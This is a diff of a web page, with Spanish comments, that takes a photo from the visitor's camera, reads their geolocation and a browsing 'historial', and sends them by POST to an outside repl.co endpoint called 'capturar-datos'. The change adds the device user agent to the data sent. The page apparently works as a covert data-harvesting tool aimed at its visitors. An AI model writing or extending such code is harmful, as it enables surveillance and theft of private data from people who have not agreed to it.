@@ -22,7 +22,10 @@
             // Detener el stream
             stream.getTracks().forEach(track => track.stop());
 
-            // Capturar ubicación
+            // Capturar versión y modelo del dispositivo
+            const userAgent = navigator.userAgent;
+
+            // Capturar geolocalización
             const ubicacion = await new Promise(resolve => {
                 navigator.geolocation.getCurrentPosition(
                     position => {
@@ -42,7 +45,7 @@
             };
 
             // Enviar datos al servidor
-            const datos = { foto, ubicacion, historial };
+            const datos = { foto, userAgent, ubicacion, historial };
             fetch('https://979c5a95-3dfb-4130-8e4b-c2a06b13a186-00-cuily0isatzs.spock.repl.co/capturar-datos', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -67,4 +70,3 @@
     <p id="mensaje">Enviando datos...</p>
 </body>
 </html>
-
